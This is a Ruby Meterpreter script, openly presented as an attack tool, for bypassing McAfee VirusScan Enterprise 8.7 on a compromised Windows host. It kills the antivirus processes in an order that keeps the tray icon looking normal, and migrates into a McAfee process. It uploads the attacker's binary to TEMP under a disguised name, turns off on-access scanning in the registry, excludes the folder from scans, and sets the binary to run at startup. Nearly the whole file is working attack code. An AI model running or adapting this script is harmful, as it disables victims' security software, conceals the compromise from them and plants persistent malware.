# Meterpreter script that kills Mcafee VirusScan Enterprise v8.7.0i+ processes in magic
# order which keeps VirusScan icon visible at system tray without disabled sign on it.
# Additionally it lets you disable On Access Scanner from registry, upload your detectable
# binary to TEMP folder, add that folder to the VirusScan exclusion list and CurrentVersion\Run
# registry key. (Requires administrator privilege. Tested on XP SP3)
#
# Credits: hdm, jduck, Jerome Athias (borrowed some of their codes)
#
# Provided by: Mert SARICA - mert.sarica [@] gmail.com - http://www.mertsarica.com

session = client
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu." ],
  "-k" => [ false,"Only kills VirusScan processes"],
  "-e" => [ true,"Executable to upload to target host. (modifies registry and exclusion list)" ]
)

################## function declaration Declarations ##################
def usage()
  print_line "\nAuthor: Mert SARICA (mert.sarica [@] gmail.com) \t\tWeb: http://www.mertsarica.com"
  print_line "----------------------------------------------------------------------------------------------"
  print_line "Bypasses Mcafee VirusScan Enterprise v8.7.0i+, uploads an executable to TEMP folder adds it"
  print_line "to exclusion list and set it to run at startup. (Requires administrator privilege)"
  print_line "----------------------------------------------------------------------------------------------"
  print_line(@@exec_opts.usage)
end

@path = ""
@location = ""

def upload(session,file,trgloc)
  if not ::File.exists?(file)
    raise "File to Upload does not exists!"
  else
    @location = session.sys.config.getenv('TEMP')
    begin
      ext = file.scan(/\S*(.exe)/i)
      if ext.join == ".exe"
        fileontrgt = "#{@location}\\MS#{rand(100)}.exe"
      else
        fileontrgt = "#{@location}\\MS#{rand(100)}#{ext}"
      end
      @path = fileontrgt
      print_status("Uploading #{file}....")
      session.fs.file.upload_file("#{fileontrgt}","#{file}")
      print_status("Uploaded as #{fileontrgt}")
    rescue ::Exception => e
      print_status("Error uploading file #{file}: #{e.class} #{e}")
    end
  end
  return fileontrgt
end

#parsing of Options
file = ""
helpcall = 0
killonly = 0
@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-e"
    file = val || ""
  when "-h"
    helpcall = 1
  when "-k"
    killonly = 1
  end

}

if killonly == 0
  if file == ""
    usage
    raise Rex::Script::Completed
  end
end

# Magic kill order :)
avs = %W{
  shstat.exe
  engineserver.exe
  frameworkservice.exe
  naprdmgr.exe
  mctray.exe
  mfeann.exe
  vstskmgr.exe
  mcshield.exe
}

av = 0

plist = client.sys.process.get_processes()
plist.each do |x|
  if (avs.index(x['name'].downcase))
    av = av + 1
  end
end


if av > 6
  print_status("VirusScan Enterprise v8.7.0i+ is running...")
else
  print_status("VirusScan Enterprise v8.7.0i+ is not running!")
  raise Rex::Script::Completed
end

target_pid = nil
target ||= "mfevtps.exe"

print_status("Migrating to #{target}...")

# Get the target process pid
target_pid = client.sys.process[target]

if not target_pid
  print_error("Could not access the target process")
  raise Rex::Script::Completed
end

print_status("Migrating into process ID #{target_pid}")
client.core.migrate(target_pid)

target_pid = nil

if killonly == 1
  avs.each do |x|
    # Get the target process pid
    target_pid = client.sys.process[x]
    print_status("Killing off #{x}...")
    client.sys.process.kill(target_pid)
  end
else
  avs.each do |x|
    # Get the target process pid
    target_pid = client.sys.process[x]
    print_status("Killing off #{x}...")
    client.sys.process.kill(target_pid)
  end

  # Upload it
  exec = upload(session,file,"")

  # Initiailze vars
  key   = nil
  value = nil
  data  = nil
  type  = nil

  # Mcafee registry key
  key = 'HKLM\Software\Mcafee\VSCore\On Access Scanner\MCShield\Configuration\Default'

  # Split the key into its parts
  root_key, base_key = client.sys.registry.splitkey(key)

  # Disable when writing to disk option
  value = "bScanIncoming"
  data = 0
  type = "REG_DWORD"
  open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
  print_status("Successful set #{key} -> #{value} to #{data}.")

  # Disable when reading from disk option
  value = "bScanOutgoing"
  data = 0
  type = "REG_DWORD"
  open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
  print_status("Successful set #{key} -> #{value} to #{data}.")

  # Disable detection of unwanted programs
  value = "ApplyNVP"
  data = 0
  type = "REG_DWORD"
  open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
  print_status("Successful set #{key} -> #{value} to #{data}.")

  # Increase the number of excluded items
  value = "NumExcludeItems"
  data = 1
  type = "REG_DWORD"
  open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
  print_status("Successful set #{key} -> #{value} to #{data}.")

  # Add executable to excluded item folder
  value = "ExcludedItem_0"
  data = "3|3|" + @location
  type = "REG_SZ"
  open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
  print_status("Successful set #{key} -> #{value} to #{data}.")

  # Set registry to run executable at startup
  key = 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
  # Split the key into its parts
  root_key, base_key = client.sys.registry.splitkey(key)
  value = "MS"
  data = @path
  open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
  open_key.set_value(value, client.sys.registry.type2str(type), data)
  print_status("Successful set #{key} -> #{value} to #{data}.")
end

print_status("Finished!")
